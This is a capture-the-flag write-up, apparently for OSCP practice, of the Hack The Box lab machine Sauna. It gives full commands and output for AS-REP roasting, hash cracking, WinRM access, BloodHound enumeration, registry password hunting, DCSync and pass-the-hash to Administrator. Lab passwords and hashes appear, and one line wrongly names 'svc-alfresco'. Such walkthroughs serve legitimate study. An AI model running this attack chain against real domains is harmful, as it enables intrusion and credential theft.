---
layout: post
title:  HTB Sauna Write-up (Being edited now)
description: Part of the OSCP+ Preparation Series
date:   2024-11-09 03:00:00 +0300
image:  '/images/htb_sauna.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Easy, Active-Directory, AS-REP-Roasting, BloodHound, DCSync, Pass-the-Hash]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration and creating usernames.txt list](#web-enumeration-and-creating-usernamestxt-list)
- [Foothold](#foothold)
  - [Trying AS-REP Roasting with usernames.txt](#trying-as-rep-roasting-with-usernamestxt)
  - [WinRM access as user fsmith using evil-winrm](#winrm-access-as-user-fsmith-using-evil-winrm)
- [Privilege Escalation](#privilege-escalation)
  - [Enumerating Active Directory Domain with BloodHound](#enumerating-active-directory-domain-with-bloodhound)
  - [Finding credentials of the user svc_loanmgr in the registry](#finding-credentials-of-the-user-svc_loanmgr-in-the-registry)
  - [DCSync with svc_loanmgr and access as Administrator with Pass-the-Hash and evil-winrm](#dcsync-with-svc_loanmgr-and-access-as-administrator-with-pass-the-hash-and-evil-winrm)
  - [Administrator access with Pass-the-Hash and evil-winrm](#administrator-access-with-pass-the-hash-and-evil-winrm)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.129.95.180

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
nmap -A -T4 -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.129.95.180
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 20:21 EST
Nmap scan report for 10.129.95.180
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-09 08:21:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-09T08:21:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.29 seconds
```
If we examine the Nmap results, we can see the egotistical-bank.local domain and a website on port 80, apart of the typical domain controller ports.
### Web Enumeration and creating usernames.txt list
If we visit the website, we will see a business website of the company Egotistical Bank:
```shell
http://10.129.95.180
```
One page that took our attention is the About Us page. If we scroll down to the bottom, we will see a Meet the Team form with the names of some workers:
```shell
http://10.129.95.180/about.html
```
Worker names are important to try to create a usernames.txt list with potentially valid usernames. Thats what we will do:
```shell
cat usernames.txt

fergussmith
hugobear
stevenkerb
shauncoins
bowietaylor
sophiedriver
fsmith
hbear
skerb
scoins
btaylor
sdriver
fergus.smith
hugo.bear
steven.kerb
shaun.coins
bowie.taylor
sophie.driver
f.smith
h.bear
s.kerb
s.coins
b.taylor
s.driver
```
# Foothold
### Trying AS-REP Roasting with usernames.txt
We will use the usernames.txt list we created to test AS-REP Roasting on each of them:

```shell
impacket-GetNPUsers egotistical-bank.local/ -usersfile usernames.txt -dc-ip 10.129.95.180
```
We got a successful result with the user fsmith, giving us a hash:

```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5b9b41ad0acb8477dccab9f1a435b2e5$87dbc1780d7c44aaf94e49e07c2b6e97788d393581331bad9f3adc469fb3f12dfc0189fee0371796f088a28d46e6e15ea9931353ee0daa8baca7dcf995bf6548b0c7c17f0749d71ed1d6b5585a0cb4b8d846c6819ffde909d8da6c4fc18258ba76f682a6aa0ba3bfddc5866cfbad3c4a8fe3531939838ac61b7a0c36a06a1ad03a06bef469d3a41d6c72805e929e44f56abc402c8443eeb8d0b0b8dfe878857aaa49bb0649a7be3d4a525394751c511bf9fa9106cd005913187eba281fc68eed00926b899e5b0646935cf4d34223e476743c9c3690e67dfb58811a513833b5f123da3c32ae313755711ae1b82dd236265771641ddccf66f9f44743db7d07f6f7
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
Cracking the hash:

```shell
hashcat -m 18200 -a 0 fsmith_hash.txt /usr/share/wordlists/rockyou.txt
```
We managed to successfully crack the hash of svc-alfresco, giving us the following credentials:

```shell
# Username
fsmith
# Password
Thestrokes23
```
### WinRM access as user fsmith using evil-winrm
We can test if the credentials are valid using NetExec:

```shell
nxc smb 10.129.95.180 -u fsmith -p Thestrokes23
```
If we get a "+" sign, we can confirm that the credentials are right.

Now we can use evil-winrm to get access:

```shell
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```
### User Flag
Now we can get the user.txt flag:
```shell
type C:\Users\fsmith\Desktop\user.txt
```
# Privilege Escalation
### Enumerating Active Directory Domain with BloodHound
We will use bloodhound-python and the credentials of the user fsmith to collect information about the domain and enumerate it further with BloodHound:

```shell
bloodhound-python -c All -u fsmith -p Thestrokes23 -d egotistical-bank.local -ns 10.129.95.180 --zip
```
Then start BloodHound and upload the .zip file that bloodhound-python created:

```shell
# Start neo4j
sudo neo4j console

# Start bloodhound
sudo bloodhound
```
Enumerating the domain using BloodHound, we found a user called svc_loanmgr which has DCSync rights over the domain. Let's do some local enumeration on the machine using fsmith, maybe we can find more information about svc_loanmgr.
### Finding credentials of the user svc_loanmgr in the registry
We used both of the following commands to check the registry:

```shell
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
Both of them gave us as result the following winlogon password, but if we examine the results of the second command closer, we will clearly see that it is the password for the svc_loanmanager account:

```shell
Moneymakestheworldgoround!
```
Let's check for valid usernames:

```shell
net user /domain
```

```shell
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
```

We can guess that svc_loanmnr is svc_loanmanager.
### DCSync with svc_loanmgr and access as Administrator with Pass-the-Hash and evil-winrm
We know from our previous enumeration using BloodHound that the user svc_loanmgr has DCSync on the domain. We can abuse this to dump the hash of the Administrator using the following command:

```shell
impacket-secretsdump svc_loanmgr@10.129.95.180 -just-dc-user Administrator -just-dc-ntlm

# Password: Moneymakestheworldgoround!
```
Nice! We got the hash of the Administrator:
```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Cleaning up...
```
### Administrator access with Pass-the-Hash and evil-winrm
Now we can Pass-the-hash to get access as Administrator using evil-winrm:

```shell
evil-winrm -i 10.129.95.180 -u Administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
```
We are in!

```shell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
```

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\Desktop\root.txt
```